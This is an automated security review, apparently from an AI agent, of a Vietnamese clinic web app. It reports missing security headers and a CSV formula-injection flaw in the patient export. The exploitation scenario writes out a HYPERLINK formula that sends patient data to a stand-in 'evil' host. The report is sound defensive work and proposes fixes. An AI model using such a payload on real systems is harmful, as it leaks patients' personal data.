<!-- secagent-report -->
## 🛡️ AI Security Agent

**Kết quả:** 11 lỗi thật (TP) · 0 cần người xem (NEEDS_REVIEW) · 0 báo nhầm (FP) · trong đó 1 phát hiện mới do Agent tự tìm · commit `66d16bf`

| | Mức | Nguồn | Phát hiện | Vị trí | Độ tin cậy |
|---|---|---|---|---|---|
| 🔴 TP | MEDIUM | agent | CSV injection (formula injection) trong xuất danh sách bệnh nhân | `app/medicare/common/csv_export.py:15` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /login:0` | 0.80 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments/{appointment_id}/cancel:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments/{appointment_id}/confirm:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients/{patient_id}/edit:0` | 0.70 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /:0` | 0.75 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /health:0` | 0.70 |
| 🔴 TP | LOW | zap | 10038 (zap) | `dast:GET /login:0` | 0.75 |

### Chi tiết

#### 🔴 TP · MEDIUM · CSV injection (formula injection) trong xuất danh sách bệnh nhân — `app/medicare/common/csv_export.py:15`

CWE-1236 · OWASP A05 · độ tin cậy 0.70 · nguồn: agent

**Phân tích:** csv_response ghi trực tiếp str(value) của các trường do người dùng nhập (full_name, address, phone...) mà không vô hiệu hóa ký tự đầu =, +, -, @, tab, CR. Khi nhân viên mở CSV bằng Excel, công thức có thể được thực thi (rò rỉ dữ liệu, DDE).

**Kịch bản khai thác:** Bệnh nhân nhập họ tên hoặc địa chỉ là =HYPERLINK("http://evil/?"&A2,"x"). Bác sĩ/admin xuất CSV và mở bằng Excel, công thức chạy và gửi dữ liệu bệnh nhân ra ngoài.

**Đề xuất sửa:** Trong csv_response (app/medicare/common/csv_export.py), với mỗi ô là chuỗi bắt đầu bằng =, +, -, @, tab hoặc CR thì thêm tiền tố dấu nháy đơn ' trước khi ghi. Bổ sung test cho trường hợp này.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** create_app trong app/medicare/main.py chỉ thêm CatchAllErrorsMiddleware, SessionMiddleware, MetricsMiddleware; không có middleware nào đặt X-Frame-Options hoặc CSP frame-ancestors. Mọi trang có thể bị nhúng vào iframe (clickjacking).

**Đề xuất sửa:** Thêm một middleware security headers trong create_app (app/medicare/main.py) để đặt X-Frame-Options: DENY, X-Content-Type-Options: nosniff và Content-Security-Policy (default-src 'self'; frame-ancestors 'none') cho mọi response.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /login:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.80 · nguồn: zap

**Phân tích:** Trang /login thiếu chống clickjacking vì toàn ứng dụng không có middleware đặt header bảo mật.

**Đề xuất sửa:** Dùng chung middleware security headers trong app/medicare/main.py (X-Frame-Options DENY / frame-ancestors 'none').

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có Content-Security-Policy nào được đặt trong ứng dụng.

**Đề xuất sửa:** Thêm Content-Security-Policy trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments/{appointment_id}/cancel:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP toàn ứng dụng.

**Đề xuất sửa:** Thêm CSP trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments/{appointment_id}/confirm:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP toàn ứng dụng.

**Đề xuất sửa:** Thêm CSP trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP toàn ứng dụng.

**Đề xuất sửa:** Thêm CSP trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients/{patient_id}/edit:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP toàn ứng dụng.

**Đề xuất sửa:** Thêm CSP trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /:0`

CWE-693 · OWASP A02 · độ tin cậy 0.75 · nguồn: zap

**Phân tích:** Thiếu X-Content-Type-Options trên toàn ứng dụng.

**Đề xuất sửa:** Thêm nosniff trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /health:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** /health cũng thiếu nosniff vì không có middleware header chung.

**Đề xuất sửa:** Thêm nosniff trong middleware security headers ở app/medicare/main.py.

#### 🔴 TP · LOW · 10038 (zap) — `dast:GET /login:0`

CWE-693 · OWASP A02 · độ tin cậy 0.75 · nguồn: zap

**Phân tích:** Không có middleware nào đặt X-Content-Type-Options: nosniff.

Gộp các phát hiện: `zap:10021:dast:GET /login:0`, `zap:10038:dast:GET /login:0`

**Đề xuất sửa:** Thêm X-Content-Type-Options: nosniff trong middleware security headers ở app/medicare/main.py.

---
<sub>LLM `claude-mcp` · model `claude-sonnet-5-5` · chiến lược `agent` · 57.5 s · 28 lần gọi LLM · 16 lần gọi công cụ · 100399 token vào / 10142 token ra · ≈ $0.1926 · chạm giới hạn: không</sub>
